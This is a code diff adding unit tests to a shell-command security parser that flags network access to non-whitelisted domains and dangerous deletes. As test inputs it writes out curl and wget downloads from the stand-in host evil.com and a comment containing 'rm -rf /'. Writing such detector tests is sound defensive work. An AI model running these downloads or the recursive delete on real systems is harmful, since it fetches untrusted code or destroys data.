@@ -63,6 +63,30 @@ class TestBashParserNetworkEgress:
         assert "R002_NON_WHITELIST_DOMAIN_ACCESS" not in rule_ids
         assert "R002_CURL_EXTERNAL_REQUEST" not in rule_ids
 
+    def test_curl_output_option_bare_domain_denied(self, parser):
+        findings = parser.parse("curl -o x evil.com")
+        rule_ids = {f.rule_id for f in findings}
+        assert "R002_NON_WHITELIST_DOMAIN_ACCESS" in rule_ids
+
+    def test_curl_long_output_option_bare_domain_denied(self, parser):
+        findings = parser.parse("curl --output x evil.com")
+        rule_ids = {f.rule_id for f in findings}
+        assert "R002_NON_WHITELIST_DOMAIN_ACCESS" in rule_ids
+
+    def test_wget_output_option_bare_domain_denied(self, parser):
+        findings = parser.parse("wget -O x evil.com")
+        rule_ids = {f.rule_id for f in findings}
+        assert "R002_NON_WHITELIST_DOMAIN_ACCESS" in rule_ids
+
+    def test_curl_output_option_whitelisted_bare_domain(self):
+        policy = PolicyConfig.default()
+        policy.allowed_commands = []
+        parser = BashParser(policy)
+        findings = parser.parse("curl -o x github.com")
+        rule_ids = {f.rule_id for f in findings}
+        assert "R002_NON_WHITELIST_DOMAIN_ACCESS" not in rule_ids
+        assert "R002_CURL_EXTERNAL_REQUEST" not in rule_ids
+
 
 class TestBashParserSystemCommands:
 
@@ -166,6 +190,19 @@ class TestPipelineQuoteFalsePositive:
         findings = parser.parse("# this is a comment with | and ;")
         rule_ids = {f.rule_id for f in findings}
         assert "R003_SHELL_PIPE_EXECUTION" not in rule_ids
+
+    def test_inline_comment_dangerous_delete_not_flagged(self, parser):
+        """Unquoted inline comments are stripped before dangerous regex scans."""
+        findings = parser.parse("echo done # rm -rf / cleanup")
+        rule_ids = {f.rule_id for f in findings}
+        assert "R001_BASH_RECURSIVE_DELETE" not in rule_ids
+
+    def test_quoted_hash_literal_is_preserved(self, parser):
+        """A # inside quotes is not treated as a shell comment."""
+        findings = parser.parse('echo "# literal"')
+        rule_ids = {f.rule_id for f in findings}
+        assert "R003_SHELL_PIPE_EXECUTION" not in rule_ids
+        assert "R001_BASH_RECURSIVE_DELETE" not in rule_ids
 
 
 class TestSensitiveSuffixDetection:
